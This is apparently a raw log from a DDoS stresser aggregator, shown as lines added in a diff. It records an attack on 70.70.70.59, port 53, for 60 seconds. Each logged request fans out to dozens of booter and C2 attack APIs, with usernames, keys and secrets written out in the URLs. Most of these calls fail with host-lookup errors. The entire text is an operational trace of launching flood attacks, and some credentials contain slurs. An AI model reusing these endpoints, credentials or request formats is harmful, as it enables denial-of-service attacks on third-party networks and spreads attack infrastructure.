+2024/12/10 16:41:37 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.59&time=60&port=53&method=UDP-BYPASS&concurrents=1
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://insanesec.com/api/start?username=flcty&key=FEf6FfnlGsish2F&target=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.59&port=53&time=60&method=UDPAU
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.59&port=53&time=60&method=UDP-PPS
+2024/12/10 16:41:37 [ATTACK] Sending request to: http://93.123.85.244/api/attack?username=begs&key=noballs&host=70.70.70.59&time=60&port=60&method=UDP-LONE
+2024/12/10 16:41:37 [ATTACK] Sending request to: http://93.123.85.244/api/attack?key=nigga&host=70.70.70.59&port=53&time=60&method=udp-gbps
+2024/12/10 16:41:37 [ATTACK] Sending request to: http://toxic-c2.de:6969/api/attack?username=vse&secret=getfucked&host=70.70.70.59&port=53&time=60&method=UDP-VSE
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=543u7yrf893wu65t3&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:37 [ATTACK] Sending request to: http://satanservices.xyz/api/attack?username=lixl&key=iPxrkan&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://kraysecurity.com/api/api.php?key=0sUU6IW0ZAaUllWX&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=gudp_api
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=udp_api
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://miami-api.cc/api/attack?username=flcty&secret=RyXMfmrXu10s&target=70.70.70.59&port=53&duration=60&method=!UDP
+2024/12/10 16:41:37 [ATTACK] Error sending request to: http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.59&port=53&time=60&method=gudp - Get "http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.59&port=53&time=60&method=gudp": dial tcp: lookup hideaki-api.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.59&port=53&duration=60&method=UDP - Get "http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.59&port=53&duration=60&method=UDP": dial tcp: lookup chronos.awaken-network.net: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.59&port=53&time=60&method=l4-udp - Get "https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.59&port=53&time=60&method=l4-udp": dial tcp: lookup private.bartrickc2.ovh: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=gudp_api
+2024/12/10 16:41:37 [ATTACK] Error sending request to: http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.59&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.59&port=53&time=60&method=udp_api - Get "http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.59&port=53&time=60&method=udp_api": dial tcp: lookup connect-synth.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns - Get "http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.59&port=53&time=60&method=udp - Get "http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP - Get "https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP": dial tcp: lookup phantom.cool: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.59&port=53&time=60&method=!udpv2&concs=1 - Get "https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.59&port=53&time=60&method=!udpv2&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.59&port=53&time=60&method=out-udp&concs=1 - Get "https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.59&port=53&time=60&method=out-udp&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: http://ddos.africa:8080/api/attack?username=moneky&password=monkey&target=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://crtz.top/api/attack?username=tsukiapi&secret=wixkwn193jen&host=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.59&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.59&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.leanc2.dev/api/attack?username=fedworld&key=7A8hgFeWq33&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=pps - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=pps": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=udpbypass - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=udpbypass": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.59&port=53&time=60&method=udpbypass
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.59&time=60&port=53&method=UDP-BYPASS
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=projectworld&key=projectworld121&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=begs&key=balls&host=70.70.70.59&port=53&time=60&method=udp-dose
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://kodachi.xyz/api/attack?username=api&key=api1234&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.vacstresser.ru/api?key=e87a0d23-f8c1-4525-bdef-c52425eb7e71&host=70.70.70.59&port=53&duration=60&method=UDPBYPASS
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.arthurc2.xyz/api/attack?username=begs&secret=balls&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.59&port=53&time=60&method=udp-vip - Get "https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.59&port=53&time=60&method=udp-vip": dial tcp: lookup api.tsuki-solutions.cc: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.59&time=60&port=53&method=UDP-PPS
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://api.skibidi.sbs/api/attack?username=tonhocau&secret=change&host=70.70.70.59&port=53&time=60&method=dns - Get "https://api.skibidi.sbs/api/attack?username=tonhocau&secret=change&host=70.70.70.59&port=53&time=60&method=dns": stopped after 10 redirects
+2024/12/10 16:41:37 [ATTACK] Error sending request to: http://api.quantiumcode.pl/api/attack?host=70.70.70.59&port=53&time=60&method=udp-vip&key=1234&username=darkc2 - Get "http://api.quantiumcode.pl/api/attack?host=70.70.70.59&port=53&time=60&method=udp-vip&key=1234&username=darkc2": dial tcp: lookup api.quantiumcode.pl: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.colombia-c2.wtf/api/attack?username=project&secret=passwd&host=70.70.70.59&time=60&port=53&method=udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=kieran&host=70.70.70.59&port=53&time=60&method=udpbypass
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.59&port=53&time=60&method=dns - Get "https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup gorilla-api.su: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=world&secret=123123&host=70.70.70.59&time=60&port=53&method=dns
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.inverse.sh?token=2DrvPtgCrvqT0x04XmSOsY&target={target}&port={port}&duration={duration}&method=UDP-SOURCE&concs=2
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.inverse.sh?token=ctKmcvX4aeZVXLF2O28uHx&host=70.70.70.59&port=53&time=60&method=UDP-SOURCE
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=sexybrofrngl&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.59&port=53&time=60&method=!udpplain
+2024/12/10 16:41:37 [ATTACK] Sending request to: http://2.59.117.173:555/api/?key=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: http://85.192.56.228/api.php?key=milka&target=70.70.70.59&duration=60&method=gudp&method_type=udp&port=53
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.59&port=53&time=60&method=!udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://aetherapi.com/api/attack?username=begs&secret=balls&host=70.70.70.59&port=53&time=60&method=api-udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.frosty.rip/rocky/api/v1/attack?license=saturnednigga&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.frosty.rip/kittybooter/api/v1/attack?license=saturnednigga&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&key=snowy&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=snowy&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://wrldsecurity.net/api/attack?username=pathc2api&secret=643t5ge4336y3467y34&host=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.59&port=53&time=60&method=udp-bypass - Get "https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.59&port=53&time=60&method=udp-bypass": dial tcp: lookup aggu.spacey.sh: no such host
+2024/12/10 16:41:38 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.59&port=53&time=60&method=UDPDROP
+2024/12/10 16:41:38 [ATTACK] Error sending request to: https://api.jetstress.su/?token=NQV083R2WjJCfYmXd2idvY&host=70.70.70.59&port=53&time=60&method=udp-a2s - Get "https://api.jetstress.su/?token=NQV083R2WjJCfYmXd2idvY&host=70.70.70.59&port=53&time=60&method=udp-a2s": dial tcp: lookup api.jetstress.su: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:38 [ATTACK] Sending request to: https://api.kaitenc2.de/api/attack?username=josh&password=balls&target=70.70.70.59&port=53&duration=60&method=.udp
+2024/12/10 16:41:38 [ATTACK] Error sending request to: https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.59&port=53&duration=60&method=udpplain - Get "https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.59&port=53&duration=60&method=udpplain": tls: failed to verify certificate: x509: certificate signed by unknown authority
+2024/12/10 16:41:39 New Attack (API)!
+Username: root
+Target: 70.70.70.59
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.59&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.59&port=53&time=60&method=out-udp&concs=1 - Get "https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.59&port=53&time=60&method=out-udp&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.spacevin.io/api/?token=bCvI7qNvWSTiwZZTWYEpYZ&host=70.70.70.59&port=53&time=60&method=udp - Get "https://api.spacevin.io/api/?token=bCvI7qNvWSTiwZZTWYEpYZ&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup api.spacevin.io: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.59&port=53&time=60&method=udp-vip - Get "https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.59&port=53&time=60&method=udp-vip": dial tcp: lookup api.tsuki-solutions.cc: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP - Get "https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP": dial tcp: lookup phantom.cool: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.59&port=53&time=60&method=!udp - Get "https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.59&port=53&time=60&method=!udp": dial tcp: lookup homicide-api.lol: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.59&port=53&time=60&method=udp-dn - Get "https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.59&port=53&time=60&method=udp-dn": dial tcp: lookup api.stdstresser.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.59&port=53&duration=60&method=UDP - Get "http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.59&port=53&duration=60&method=UDP": dial tcp: lookup chronos.awaken-network.net: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123123&host=70.70.70.59&port=53&time=60&method=gudp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123123&host=70.70.70.59&port=53&time=60&method=gudp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.59&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.59&port=53&time=60&method=gudp - Get "http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.59&port=53&time=60&method=gudp": dial tcp: lookup hideaki-api.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: http://api.quantiumcode.pl/api/attack?host=70.70.70.59&port=53&time=60&method=udp-vip&key=1234&username=darkc2 - Get "http://api.quantiumcode.pl/api/attack?host=70.70.70.59&port=53&time=60&method=udp-vip&key=1234&username=darkc2": dial tcp: lookup api.quantiumcode.pl: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.59&port=53&time=60&method=GUDP - Get "https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.59&port=53&time=60&method=GUDP": dial tcp: lookup api.theeye.cloud: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.59&port=53&time=60&method=udp-bypass - Get "https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.59&port=53&time=60&method=udp-bypass": dial tcp: lookup aggu.spacey.sh: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=udpbypass - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=udpbypass": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.59&port=53&time=60&method=!udpv2&concs=1 - Get "https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.59&port=53&time=60&method=!udpv2&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.jetstress.su/?token=NQV083R2WjJCfYmXd2idvY&host=70.70.70.59&port=53&time=60&method=udp-a2s - Get "https://api.jetstress.su/?token=NQV083R2WjJCfYmXd2idvY&host=70.70.70.59&port=53&time=60&method=udp-a2s": dial tcp: lookup api.jetstress.su: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.59&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.59&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=pps - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=pps": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.59&port=53&time=60&method=udp - Get "http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.59&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123vts&host=70.70.70.59&port=53&time=60&method=gudp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123vts&host=70.70.70.59&port=53&time=60&method=gudp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns - Get "http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.papernetwork.xyz/api/attack?username=flcty&key=MBenz300&target=70.70.70.59&port=53&duration=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=udp_api
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.59&port=53&time=60&method=GUDP - Get "https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.59&port=53&time=60&method=GUDP": dial tcp: lookup api.theeye.cloud: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.59&time=60&port=53&method=UDP-BOOM&concurrents=1
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.59&port=53&time=60&method=udp - Get "https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup brainc2.uk: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.59&port=53&time=60&method=l4-udp - Get "https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.59&port=53&time=60&method=l4-udp": dial tcp: lookup private.bartrickc2.ovh: no such host
